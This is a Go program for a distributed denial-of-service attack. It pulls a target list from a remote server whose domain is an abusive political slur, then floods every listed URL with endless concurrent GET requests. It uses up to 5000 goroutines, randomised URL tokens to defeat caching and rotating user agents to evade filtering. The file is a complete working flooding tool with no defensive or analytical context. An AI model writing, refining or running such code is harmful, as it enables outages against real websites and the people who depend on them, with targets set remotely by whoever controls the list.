package main

import (
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"sync/atomic"
	"time"
)

type Result struct {
	URLs []string `json:"targets"`
}

type UserAgent struct {
	UserAgent string `json:"USER_AGENT"`
}

var MaxGoroutines = 5000

func main() {
	args := os.Args
	if len(args) > 1 {
		maxGoroutines, err := strconv.Atoi(args[1])
		if err != nil {
			fmt.Println("Invalid number of max goroutines, using default:", MaxGoroutines)
		} else {
			MaxGoroutines = maxGoroutines
			fmt.Println("threads set to:", MaxGoroutines)
		}
	}

	rand.Seed(time.Now().UnixNano())

	content, err := fetchContent("https://fuck-hamas.com/targets.json")
	if err != nil {
		fmt.Println("Error fetching content from https://fuck-hamas.com/targets.json. Using local targets.json")
		content, err = ioutil.ReadFile("targets.json")
		if err != nil {
			panic(err)
		}
	} else {
		fmt.Println("Using remote targets.json")
	}

	var result Result
	err = json.Unmarshal(content, &result)
	if err != nil {
		panic(err)
	}

	content, err = ioutil.ReadFile("user_agents.json")
	if err != nil {
		panic(err)
	}

	var userAgents []UserAgent
	json.Unmarshal(content, &userAgents)

	clients := make([]*http.Client, MaxGoroutines)
	for i := 0; i < MaxGoroutines; i++ {
		clients[i] = &http.Client{
			Timeout: time.Second * 10,
		}
	}

	semaphore := make(chan struct{}, MaxGoroutines)

	var counter uint64
	go func() {
		for {
			time.Sleep(time.Second)
			count := atomic.SwapUint64(&counter, 0)
			fmt.Println("Requests per second:", count)
		}
	}()

	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, os.Interrupt)
	go func() {
		<-sigCh
		fmt.Println("Stopping DDOS Attack")

		os.Exit(0)
	}()

	for {
		for _, url := range result.URLs {
			semaphore <- struct{}{}
			go func(url string) {
				defer func() { <-semaphore }()

				randomURL := generateRandomURL(url)
				client := clients[rand.Intn(MaxGoroutines)]

				req, err := http.NewRequest("GET", randomURL, nil)
				if err != nil {
					return
				}

				index := rand.Intn(len(userAgents))

				req.Header.Set("User-Agent", userAgents[index].UserAgent)

				resp, err := client.Do(req)
				if err != nil {
					return
				}
				resp.Body.Close()

				atomic.AddUint64(&counter, 1)
			}(url)
		}
	}
}

func fetchContent(url string) ([]byte, error) {
	resp, err := http.Get(url)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	return ioutil.ReadAll(resp.Body)
}

func generateRandomURL(url string) string {
	return strings.Replace(url, "R4ND0M", randomHex(10), -1)
}

func randomHex(n int) string {
	bytes := make([]byte, n)
	rand.Read(bytes)
	return fmt.Sprintf("%x", bytes)
}
